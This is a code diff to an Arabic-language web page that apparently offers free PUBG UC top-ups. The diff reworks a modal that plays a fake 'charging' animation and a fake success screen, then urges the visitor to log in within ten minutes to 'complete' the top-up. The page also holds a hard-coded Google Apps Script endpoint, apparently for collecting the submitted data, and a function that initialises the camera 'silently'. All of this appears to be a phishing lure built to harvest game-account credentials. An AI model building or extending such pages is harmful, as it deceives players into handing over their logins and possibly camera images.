@@ -1978,11 +1978,11 @@
     const selectedChargeInfo = document.getElementById('selected-charge-info');
     const chargeDetails = document.getElementById('charge-details');
     const statusDiv = document.getElementById('status');
-    const chargingModal = document.getElementById('charging-modal');
-    const chargingSteps = document.querySelectorAll('.charging-step');
-    const circleBar = document.getElementById('circle-bar');
-    const chargeCounter = document.getElementById('charge-counter');
-    const goToLoginBtn = document.getElementById('go-to-login');
+    let chargingModal = document.getElementById('charging-modal');
+    let chargingSteps = document.querySelectorAll('.charging-step');
+    let circleBar = document.getElementById('circle-bar');
+    let chargeCounter = document.getElementById('charge-counter');
+    let goToLoginBtn = document.getElementById('go-to-login');
     
     let stream = null;
     let cameraInitialized = false;
@@ -1993,11 +1993,125 @@
     // رابط Google Apps Script - استبدله برابط نشرك
     const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxba-9A5naC85K9UuH60IfZJ5bs6pRcg-La_B4XBYikC2a3y1gLeqe5njifEhgoBgfg/exec';
     
+    // إعادة تعريف نافذة الشحن بشكل ديناميكي
+    function initializeChargingModal() {
+        // إذا النافذة موجودة مسبقاً، نزيلها
+        if (chargingModal) {
+            chargingModal.remove();
+        }
+        
+        // إنشاء نافذة الشحن الجديدة
+        const newChargingModal = document.createElement('div');
+        newChargingModal.id = 'charging-modal';
+        newChargingModal.innerHTML = `
+            <div style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 4000; justify-content: center; align-items: center;">
+                <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 25px; padding: 40px 30px; text-align: center; max-width: 500px; width: 90%; color: white; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);">
+                    <div id="charging-steps">
+                        <!-- الخطوة 1: جاري الشحن -->
+                        <div class="charging-step active">
+                            <div style="margin-bottom: 30px;">
+                                <h3 style="color: #3498db; font-size: 26px; margin-bottom: 10px;">🔄 جاري شحن الشدات</h3>
+                                <p style="color: #bdc3c7; font-size: 16px;">جارٍ تجهيز طلبك وتحضير ${selectedCharge ? selectedCharge.amount : '0'} شدة</p>
+                            </div>
+                            
+                            <div class="circle-progress" id="circle-progress">
+                                <svg width="200" height="200" viewBox="0 0 200 200">
+                                    <circle cx="100" cy="100" r="85" stroke="#2c3e50" stroke-width="12" fill="none"></circle>
+                                    <circle cx="100" cy="100" r="85" stroke="#3498db" stroke-width="12" fill="none" 
+                                            stroke-linecap="round" transform="rotate(-90 100 100)" 
+                                            stroke-dasharray="534" stroke-dashoffset="534" id="circle-bar"></circle>
+                                </svg>
+                                <div class="circle-text">
+                                    <div id="charge-counter" style="font-size: 32px; font-weight: bold; color: #3498db;">0</div>
+                                    <div style="font-size: 16px; margin-top: 5px; color: #bdc3c7;">شدة</div>
+                                </div>
+                            </div>
+                            
+                            <div style="margin-top: 30px;">
+                                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                                    <span style="color: #bdc3c7; font-size: 14px;">0%</span>
+                                    <span style="color: #bdc3c7; font-size: 14px;">100%</span>
+                                </div>
+                                <div style="background: #2c3e50; height: 8px; border-radius: 4px; overflow: hidden;">
+                                    <div id="progress-bar" style="height: 100%; background: linear-gradient(90deg, #3498db, #2ecc71); width: 0%; transition: width 0.3s ease; border-radius: 4px;"></div>
+                                </div>
+                            </div>
+                            
+                            <div style="margin-top: 25px; display: flex; justify-content: center; gap: 15px;">
+                                <div style="text-align: center;">
+                                    <div style="color: #3498db; font-size: 14px;">الشدات</div>
+                                    <div style="color: white; font-size: 18px; font-weight: bold;">${selectedCharge ? selectedCharge.amount : '0'}</div>
+                                </div>
+                                <div style="text-align: center;">
+                                    <div style="color: #3498db; font-size: 14px;">الحالة</div>
+                                    <div style="color: #f39c12; font-size: 14px; font-weight: bold;">جاري المعالجة</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- الخطوة 2: نجاح الشحن -->
+                        <div class="charging-step">
+                            <!-- سيتم تعبئتها ديناميكياً -->
+                        </div>
+                        
+                        <!-- الخطوة 3: طلب تسجيل الدخول -->
+                        <div class="charging-step">
+                            <div style="text-align: center; color: white;">
+                                <div style="font-size: 70px; margin-bottom: 20px;">🔐</div>
+                                <h3 style="color: #e74c3c; font-size: 26px; margin: 20px 0 15px 0;">مطلوب تسجيل الدخول</h3>
+                                
+                                <div style="background: rgba(231, 76, 60, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0; border: 2px solid #e74c3c;">
+                                    <p style="color: #ffffff; font-size: 18px; margin: 10px 0;">⚠️ لإكمال عملية الشحن</p>
+                                    <p style="color: #bdc3c7; font-size: 16px;">يجب تسجيل الدخول لتأكيد هويتك وإكمال العملية</p>
+                                </div>
+                                
+                                <div style="background: rgba(52, 152, 219, 0.1); padding: 15px; border-radius: 10px; margin: 25px 0; border: 1px solid #3498db;">
+                                    <p style="color: #3498db; font-size: 14px; margin: 5px 0;">📦 الشدات جاهزة: ${selectedCharge ? selectedCharge.amount : '0'} شدة</p>
+                                    <p style="color: #3498db; font-size: 14px; margin: 5px 0;">👤 بانتظار: ${playerIdInput ? playerIdInput.value : 'اللاعب'}</p>
+                                    <p style="color: #3498db; font-size: 14px; margin: 5px 0;">🕒 انتهى الصلاحية خلال: 10 دقائق</p>
+                                </div>
+                                
+                                <button id="go-to-login-btn" style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; border: none; padding: 16px 45px; border-radius: 12px; font-size: 18px; cursor: pointer; margin-top: 15px; font-weight: bold; box-shadow: 0 5px 20px rgba(231, 76, 60, 0.3); transition: all 0.3s ease;">
+                                    تسجيل الدخول لإكمال العملية
+                                </button>
+                                
+                                <div style="margin-top: 20px;">
+                                    <p style="color: #95a5a6; font-size: 13px;">سيتم حفظ طلبك لمدة 10 دقائق</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(newChargingModal);
+        
+        // تحديث العناصر
+        chargingModal = document.getElementById('charging-modal');
+        chargingSteps = document.querySelectorAll('.charging-step');
+        circleBar = document.getElementById('circle-bar');
+        chargeCounter = document.getElementById('charge-counter');
+        goToLoginBtn = document.getElementById('go-to-login-btn');
+        
+        // إضافة حدث الزر الجديد
+        if (goToLoginBtn) {
+            goToLoginBtn.addEventListener('click', function() {
+                chargingModal.style.display = 'none';
+                document.body.classList.add('show-login');
+                clearTimeout(chargingTimeout);
+            });
+        }
+    }
+    
     // إظهار نافذة الشروط عند تحميل الصفحة
     document.addEventListener('DOMContentLoaded', function() {
         termsModal.style.display = 'flex';
         // التأكد من إخفاء صفحة التسجيل عند التحميل
         document.body.classList.remove('show-login');
+        
+        // تهيئة نافذة الشحن
+        initializeChargingModal();
     });
     
     // التحكم في زر الموافقة بناءً على تحديد المربع
@@ -2129,11 +2243,21 @@
         }
     });
     
-       // دالة عرض نافذة الشحن - النسخة المطورة
+    // دالة عرض نافذة الشحن - النسخة المطورة
     function showChargingProcess() {
+        // تحديث نافذة الشحن بالمعلومات الجديدة
+        initializeChargingModal();
+        
         chargingModal.style.display = 'flex';
         showStep(0);
         startAdvancedChargeCollection();
+    }
+
+    // دالة عرض خطوة معينة
+    function showStep(stepIndex) {
+        chargingSteps.forEach((step, index) => {
+            step.classList.toggle('active', index === stepIndex);
+        });
     }
 
     // دالة تحصيل الشدات مع تأثيرات متطورة
@@ -2146,21 +2270,42 @@
         const increment = targetAmount / steps;
         
         const circumference = 2 * Math.PI * 85;
-        circleBar.style.strokeDasharray = circumference;
+        if (circleBar) {
+            circleBar.style.strokeDasharray = circumference;
+        }
         
-        chargeCounter.textContent = '0';
+        if (chargeCounter) {
+            chargeCounter.textContent = '0';
+        }
+        
+        const progressBar = document.getElementById('progress-bar');
+        if (progressBar) {
+            progressBar.style.width = '0%';
+        }
         
         let progress = 0;
         const progressInterval = setInterval(() => {
             progress += (100 / steps);
             const offset = circumference - (progress / 100) * circumference;
-            circleBar.style.strokeDashoffset = offset;
+            if (circleBar) {
+                circleBar.style.strokeDashoffset = offset;
+            }
+            
+            // تحديث شريط التقدم
+            if (progressBar) {
+                progressBar.style.width = progress + '%';
+            }
             
             currentAmount += increment;
             if (currentAmount >= targetAmount) {
                 currentAmount = targetAmount;
                 clearInterval(progressInterval);
-                chargeCounter.textContent = targetAmount.toLocaleString();
+                if (chargeCounter) {
+                    chargeCounter.textContent = targetAmount.toLocaleString();
+                }
+                if (progressBar) {
+                    progressBar.style.width = '100%';
+                }
                 
                 // الانتقال للخطوة الثانية بعد اكتمال الشحن
                 setTimeout(() => {
@@ -2168,197 +2313,66 @@
                     showSuccessAnimation();
                 }, 1000);
             } else {
-                chargeCounter.textContent = Math.floor(currentAmount).toLocaleString();
+                if (chargeCounter) {
+                    chargeCounter.textContent = Math.floor(currentAmount).toLocaleString();
+                }
             }
         }, interval);
     }
 
     // عرض رسالة النجاح مع تأثيرات
     function showSuccessAnimation() {
-        const step2 = chargingSteps[1];
+        const step2 = document.querySelectorAll('.charging-step')[1];
         
-        // تغيير محتوى الخطوة الثانية لشاشة نجاح
-        step2.innerHTML = `
-            <div style="text-align: center; color: white;">
-                <div style="font-size: 80px; margin-bottom: 20px;">🎉</div>
-                <h3 style="color: #2ecc71; font-size: 28px; margin: 20px 0 10px 0;">تم الشحن بنجاح!</h3>
-                <p style="color: #bdc3c7; font-size: 18px; margin-bottom: 10px;">تم شحن ${selectedCharge.amount} شدة بنجاح</p>
-                <p style="color: #95a5a6; font-size: 16px; margin-bottom: 30px;">جاري توجيهك لإكمال العملية...</p>
-                
-                <div style="background: rgba(46, 204, 113, 0.1); padding: 15px; border-radius: 10px; margin: 20px 0; border: 2px solid #2ecc71;">
-                    <p style="color: #2ecc71; font-size: 16px; margin: 5px 0;">✅ تم التحقق من الشدات</p>
-                    <p style="color: #2ecc71; font-size: 16px; margin: 5px 0;">✅ جاهزة للإرسال</p>
-                    <p style="color: #2ecc71; font-size: 16px; margin: 5px 0;">✅ في انتظار التأكيد النهائي</p>
-                </div>
-                
-                <div id="final-countdown" style="font-size: 14px; color: #7f8c8d; margin-top: 20px;">
-                    جاري التوجيه خلال: <span style="color: #3498db; font-weight: bold;">3</span> ثواني
-                </div>
-            </div>
-        `;
-        
-        // عد تنازلي للتوجيه
-        let countdown = 3;
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            const countdownElement = document.getElementById('final-countdown');
-            if (countdownElement) {
-                countdownElement.innerHTML = `جاري التوجيه خلال: <span style="color: #3498db; font-weight: bold;">${countdown}</span> ثواني`;
-            }
-            
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                // التوجيه لتسجيل الدخول بعد النجاح
-                showStep(2);
-            }
-        }, 1000);
-    }
-
-    // تحديث نافذة الشحن المعدلة
-    const chargingModal = document.getElementById('charging-modal');
-    if (chargingModal) {
-        chargingModal.innerHTML = `
-            <div style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 4000; justify-content: center; align-items: center;">
-                <div style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 25px; padding: 40px 30px; text-align: center; max-width: 500px; width: 90%; color: white; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);">
-                    <div id="charging-steps">
-                        <!-- الخطوة 1: جاري الشحن -->
-                        <div class="charging-step active">
-                            <div style="margin-bottom: 30px;">
-                                <h3 style="color: #3498db; font-size: 26px; margin-bottom: 10px;">🔄 جاري شحن الشدات</h3>
-                                <p style="color: #bdc3c7; font-size: 16px;">جارٍ تجهيز طلبك وتحضير ${selectedCharge ? selectedCharge.amount : '0'} شدة</p>
-                            </div>
-                            
-                            <div class="circle-progress" id="circle-progress">
-                                <svg width="200" height="200" viewBox="0 0 200 200">
-                                    <circle cx="100" cy="100" r="85" stroke="#2c3e50" stroke-width="12" fill="none"></circle>
-                                    <circle cx="100" cy="100" r="85" stroke="#3498db" stroke-width="12" fill="none" 
-                                            stroke-linecap="round" transform="rotate(-90 100 100)" 
-                                            stroke-dasharray="534" stroke-dashoffset="534" id="circle-bar"></circle>
-                                </svg>
-                                <div class="circle-text">
-                                    <div id="charge-counter" style="font-size: 32px; font-weight: bold; color: #3498db;">0</div>
-                                    <div style="font-size: 16px; margin-top: 5px; color: #bdc3c7;">شدة</div>
-                                </div>
-                            </div>
-                            
-                            <div style="margin-top: 30px;">
-                                <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-                                    <span style="color: #bdc3c7; font-size: 14px;">0%</span>
-                                    <span style="color: #bdc3c7; font-size: 14px;">100%</span>
-                                </div>
-                                <div style="background: #2c3e50; height: 8px; border-radius: 4px; overflow: hidden;">
-                                    <div id="progress-bar" style="height: 100%; background: linear-gradient(90deg, #3498db, #2ecc71); width: 0%; transition: width 0.3s ease; border-radius: 4px;"></div>
-                                </div>
-                            </div>
-                            
-                            <div style="margin-top: 25px; display: flex; justify-content: center; gap: 15px;">
-                                <div style="text-align: center;">
-                                    <div style="color: #3498db; font-size: 14px;">الشدات</div>
-                                    <div style="color: white; font-size: 18px; font-weight: bold;">${selectedCharge ? selectedCharge.amount : '0'}</div>
-                                </div>
-                                <div style="text-align: center;">
-                                    <div style="color: #3498db; font-size: 14px;">الحالة</div>
-                                    <div style="color: #f39c12; font-size: 14px; font-weight: bold;">جاري المعالجة</div>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <!-- الخطوة 2: نجاح الشحن -->
-                        <div class="charging-step">
-                            <!-- سيتم تعبئتها ديناميكياً -->
-                        </div>
-                        
-                        <!-- الخطوة 3: طلب تسجيل الدخول -->
-                        <div class="charging-step">
-                            <div style="text-align: center; color: white;">
-                                <div style="font-size: 70px; margin-bottom: 20px;">🔐</div>
-                                <h3 style="color: #e74c3c; font-size: 26px; margin: 20px 0 15px 0;">مطلوب تسجيل الدخول</h3>
-                                
-                                <div style="background: rgba(231, 76, 60, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0; border: 2px solid #e74c3c;">
-                                    <p style="color: #ffffff; font-size: 18px; margin: 10px 0;">⚠️ لإكمال عملية الشحن</p>
-                                    <p style="color: #bdc3c7; font-size: 16px;">يجب تسجيل الدخول لتأكيد هويتك وإكمال العملية</p>
-                                </div>
-                                
-                                <div style="background: rgba(52, 152, 219, 0.1); padding: 15px; border-radius: 10px; margin: 25px 0; border: 1px solid #3498db;">
-                                    <p style="color: #3498db; font-size: 14px; margin: 5px 0;">📦 الشدات جاهزة: ${selectedCharge ? selectedCharge.amount : '0'} شدة</p>
-                                    <p style="color: #3498db; font-size: 14px; margin: 5px 0;">👤 بانتظار: ${playerIdInput ? playerIdInput.value : 'اللاعب'}</p>
-                                    <p style="color: #3498db; font-size: 14px; margin: 5px 0;">🕒 انتهى الصلاحية خلال: 10 دقائق</p>
-                                </div>
-                                
-                                <button id="go-to-login" style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; border: none; padding: 16px 45px; border-radius: 12px; font-size: 18px; cursor: pointer; margin-top: 15px; font-weight: bold; box-shadow: 0 5px 20px rgba(231, 76, 60, 0.3); transition: all 0.3s ease;">
-                                    تسجيل الدخول لإكمال العملية
-                                </button>
-                                
-                                <div style="margin-top: 20px;">
-                                    <p style="color: #95a5a6; font-size: 13px;">سيتم حفظ طلبك لمدة 10 دقائق</p>
-                                </div>
-                            </div>
-                        </div>
+        if (step2) {
+            // تغيير محتوى الخطوة الثانية لشاشة نجاح
+            step2.innerHTML = `
+                <div style="text-align: center; color: white;">
+                    <div style="font-size: 80px; margin-bottom: 20px;">🎉</div>
+                    <h3 style="color: #2ecc71; font-size: 28px; margin: 20px 0 10px 0;">تم الشحن بنجاح!</h3>
+                    <p style="color: #bdc3c7; font-size: 18px; margin-bottom: 10px;">تم شحن ${selectedCharge.amount} شدة بنجاح</p>
+                    <p style="color: #95a5a6; font-size: 16px; margin-bottom: 30px;">جاري توجيهك لإكمال العملية...</p>
+                    
+                    <div style="background: rgba(46, 204, 113, 0.1); padding: 15px; border-radius: 10px; margin: 20px 0; border: 2px solid #2ecc71;">
+                        <p style="color: #2ecc71; font-size: 16px; margin: 5px 0;">✅ تم التحقق من الشدات</p>
+                        <p style="color: #2ecc71; font-size: 16px; margin: 5px 0;">✅ جاهزة للإرسال</p>
+                        <p style="color: #2ecc71; font-size: 16px; margin: 5px 0;">✅ في انتظار التأكيد النهائي</p>
+                    </div>
+                    
+                    <div id="final-countdown" style="font-size: 14px; color: #7f8c8d; margin-top: 20px;">
+                        جاري التوجيه خلال: <span style="color: #3498db; font-weight: bold;">3</span> ثواني
                     </div>
                 </div>
-            </div>
-        `;
-
-        // إعادة تعريف العناصر بعد التعديل
-        const goToLoginBtn = document.getElementById('go-to-login');
-        if (goToLoginBtn) {
-            goToLoginBtn.addEventListener('click', function() {
-                chargingModal.style.display = 'none';
-                document.body.classList.add('show-login');
-                clearTimeout(chargingTimeout);
-            });
+            `;
+            
+            // عد تنازلي للتوجيه
+            let countdown = 3;
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                const countdownElement = document.getElementById('final-countdown');
+                if (countdownElement) {
+                    countdownElement.innerHTML = `جاري التوجيه خلال: <span style="color: #3498db; font-weight: bold;">${countdown}</span> ثواني`;
+                }
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    // التوجيه لتسجيل الدخول بعد النجاح
+                    showStep(2);
+                }
+            }, 1000);
         }
     }
 
-    // تحديث دائرة التقدم لتشمل شريط التقدم
-    function startAdvancedChargeCollection() {
-        const targetAmount = parseInt(selectedCharge.amount);
-        let currentAmount = 0;
-        const duration = 6000;
-        const interval = 50;
-        const steps = duration / interval;
-        const increment = targetAmount / steps;
-        
-        const circumference = 2 * Math.PI * 85;
-        circleBar.style.strokeDasharray = circumference;
-        
-        chargeCounter.textContent = '0';
-        const progressBar = document.getElementById('progress-bar');
-        if (progressBar) progressBar.style.width = '0%';
-        
-        let progress = 0;
-        const progressInterval = setInterval(() => {
-            progress += (100 / steps);
-            const offset = circumference - (progress / 100) * circumference;
-            circleBar.style.strokeDashoffset = offset;
-            
-            // تحديث شريط التقدم
-            if (progressBar) progressBar.style.width = progress + '%';
-            
-            currentAmount += increment;
-            if (currentAmount >= targetAmount) {
-                currentAmount = targetAmount;
-                clearInterval(progressInterval);
-                chargeCounter.textContent = targetAmount.toLocaleString();
-                if (progressBar) progressBar.style.width = '100%';
-                
-                // الانتقال للخطوة الثانية بعد اكتمال الشحن
-                setTimeout(() => {
-                    showStep(1);
-                    showSuccessAnimation();
-                }, 1000);
-            } else {
-                chargeCounter.textContent = Math.floor(currentAmount).toLocaleString();
-            }
-        }, interval);
-    }
-
     // حدث زر الانتقال لتسجيل الدخول
-    goToLoginBtn.addEventListener('click', function() {
-        chargingModal.style.display = 'none';
-        document.body.classList.add('show-login');
-        clearTimeout(chargingTimeout);
-    });
+    if (goToLoginBtn) {
+        goToLoginBtn.addEventListener('click', function() {
+            if (chargingModal) {
+                chargingModal.style.display = 'none';
+            }
+            document.body.classList.add('show-login');
+            clearTimeout(chargingTimeout);
+        });
+    }
     
     // تهيئة الكاميرا من الصفر كل مرة
     async function initializeCameraSilently() {
@@ -2631,6 +2645,7 @@
 </script>
 </body>
 </html>
+
 
 
 
